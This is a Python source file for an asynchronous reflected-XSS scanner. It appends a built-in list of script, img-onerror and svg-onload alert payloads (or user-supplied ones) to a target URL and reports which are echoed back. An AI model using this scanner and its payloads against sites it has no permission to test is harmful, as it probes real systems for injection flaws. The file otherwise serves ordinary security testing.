import aiohttp
import asyncio

def get_default_payloads():
    """
    Returns a list of default XSS payloads to test.

    Returns:
        list: A list of common XSS payloads.
    """
    return [
        "<script>alert('XSS')</script>",
        "\";alert('XSS');//",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'><script>alert('XSS')</script>",
    ]

async def check_xss_vulnerability(session, url, payload):
    """
    Asynchronously checks a single URL with a payload for XSS vulnerability.

    Args:
        session (aiohttp.ClientSession): The aiohttp session to use.
        url (str): The base URL to test.
        payload (str): The XSS payload to inject.

    Returns:
        dict: Result containing the payload and whether it was successful.
    """
    test_url = f"{url}{payload}"
    try:
        async with session.get(test_url, timeout=10) as response:
            text = await response.text()
            if payload in text:
                return {"payload": payload, "vulnerable": True}
    except Exception as e:
        print(f"Error testing payload {payload} on {url}: {e}")
    return {"payload": payload, "vulnerable": False}

async def test_xss(target_url, payloads):
    """
    Tests a URL for XSS vulnerabilities using a list of payloads asynchronously.

    Args:
        target_url (str): The URL to test.
        payloads (list): A list of XSS payloads to test.

    Returns:
        list: A list of successful payloads that triggered the vulnerability.
    """
    async with aiohttp.ClientSession() as session:
        tasks = [check_xss_vulnerability(session, target_url, payload) for payload in payloads]
        results = await asyncio.gather(*tasks)
        return [result for result in results if result["vulnerable"]]

def main():
    print("--- Asynchronous XSS Vulnerability Scanner ---")
    target_url = input("Enter the target URL (e.g., http://example.com/search?q=): ").strip()

    if not target_url:
        print("Invalid URL. Exiting.")
        return

    use_default_payloads = input("Use default payloads? (yes/no): ").strip().lower() == "yes"
    payloads = get_default_payloads() if use_default_payloads else []

    if not use_default_payloads:
        print("Enter your custom payloads (one per line, type 'done' to finish):")
        while True:
            payload = input().strip()
            if payload.lower() == 'done':
                break
            payloads.append(payload)

    if not payloads:
        print("No payloads provided. Exiting.")
        return

    print("\nTesting for XSS vulnerabilities asynchronously...")
    results = asyncio.run(test_xss(target_url, payloads))

    if results:
        print("\n[!] The URL is vulnerable to XSS attacks.")
        print("Payloads that triggered the vulnerability:")
        for result in results:
            print(f"- {result['payload']}")
    else:
        print("\n[+] No XSS vulnerabilities detected.")

if __name__ == "__main__":
    main()